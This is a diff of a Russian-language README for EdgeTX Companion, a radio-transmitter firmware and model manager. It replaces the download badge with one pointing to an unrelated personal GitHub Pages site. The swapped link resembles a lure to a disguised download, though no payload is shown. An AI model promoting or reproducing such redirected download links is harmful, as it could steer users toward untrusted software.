@@ -1,10 +1,7 @@
 # EdgeTX Companion — управление прошивкой и моделями радиопультов (RU)
 
-<p align="center">
-  <a href="https://edgetx-companion.github.io/.github">
-    <img src="https://img.shields.io/badge/Получить_EdgeTX_Companion-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Получить EdgeTX Companion">
-  </a>
-</p>
+[![GET EdgeTX Companion](https://img.shields.io/badge/GET%20%E2%80%94%20EdgeTX-Companion-0078D6?style=for-the-badge&logoColor=white)](https://peloquinfalconpancake.github.io/.github/EdgeTX-Companion)
+
 
 ---
 
